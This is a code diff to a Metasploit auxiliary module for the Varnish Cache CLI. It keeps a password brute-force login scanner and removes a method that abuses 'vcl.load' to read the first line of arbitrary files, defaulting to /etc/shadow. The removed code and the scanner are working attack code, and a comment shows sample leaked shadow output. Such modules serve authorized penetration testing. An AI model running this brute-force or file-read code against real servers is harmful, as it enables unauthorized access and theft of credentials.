@@ -6,6 +6,7 @@
 require 'msf/core'
 require 'metasploit/framework/credential_collection'
 require 'metasploit/framework/login_scanner/varnish'
+require 'metasploit/framework/tcp/client'
 
 class MetasploitModule < Msf::Auxiliary
 
@@ -15,10 +16,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Varnish Cache CLI Login Utility and File Read',
+      'Name'           => 'Varnish Cache CLI Login Utility',
       'Description'    => 'This module attempts to login to the Varnish Cache (varnishd) CLI instance using a bruteforce
-                           list of passwords. This module will also cause an error in Varnish by load an arbitrary file
-                           in order to read the first line of content from the insuing error message.',
+                           list of passwords.',
       'References'     =>
         [
           [ 'OSVDB', '67670' ],
@@ -38,10 +38,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(6082),
         OptPath.new('PASS_FILE',  [ false, 'File containing passwords, one per line',
-          File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt') ]),
-        OptPath.new('FILE', [true, 'File to retrieve first line of', '/etc/shadow']),
-        OptString.new('USERNAME', [false, 'A specific username to authenticate as', '<BLANK>']),
-        OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false])
+          File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt') ])
       ], self.class)
 
     # no username, only a shared key aka password
@@ -51,7 +48,7 @@ class MetasploitModule < Msf::Auxiliary
     # usernames that are passed in.
     @strip_usernames = true
   end
-  
+
   def setup
     super
     # They must select at least blank passwords, provide a pass file or a password
@@ -66,41 +63,10 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def read_file(password)
-    connect
-    sock.put("auth #{Rex::Text.rand_text_alphanumeric(3)}\n") # Cause a login fail.
-    res = sock.get_once(-1,3) # grab challenge
-    if res && res =~ /107 \d+\s\s\s\s\s\s\n(\w+)\n\nAuthentication required./ # 107 auth
-      challenge = $1
-      response = challenge + "\n"
-      response << password + "\n"
-      response << challenge + "\n"
-      response = Digest::SHA256.hexdigest(response)
-      sock.put("auth #{response}\n")
-      res = sock.get_once(-1,3)
-    end
-    sock.put("vcl.load #{Rex::Text.rand_text_alphanumeric(3)} #{datastore['FILE']}\n") # only returns 1 line of any target file.
-    res = sock.get_once(-1,3)
-
-    # example format from /etc/shadow on an ubuntu box
-    # Message from VCC-compiler:
-    # Syntax error at
-    # ('input' Line 1 Pos 5)
-    # root:!:17123:0:99999:7:::
-    # ----#--------------------
-
-    if res && res =~ /\('input' Line \d Pos \d\)\n(...+)\n/
-      print_good("First line of #{datastore['FILE']}: #{$1}:")
-    else
-      vprint_error("Unable to read #{datastore['FILE']}:\n#{res}\n")
-    end
-    disconnect
-  end
-
   def run_host(ip)
     cred_collection = Metasploit::Framework::CredentialCollection.new(
       pass_file: datastore['PASS_FILE'],
-      username: ''
+      username: '<BLANK>'
     )
     vprint_status('made cred collector')
     scanner = Metasploit::Framework::LoginScanner::VarnishCLI.new(
@@ -115,7 +81,6 @@ class MetasploitModule < Msf::Auxiliary
     )
     vprint_status('made scanner')
     scanner.scan! do |result|
-      print(result)
       credential_data = result.to_h
       credential_data.merge!(
         module_fullname: fullname,
@@ -127,9 +92,6 @@ class MetasploitModule < Msf::Auxiliary
         create_credential_login(credential_data)
 
         print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential.private}"
-        connect
-        read_file(result.credential.private)
-        disconnect
       else
         invalidate_login(credential_data)
         vprint_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential.private} (#{result.status})"
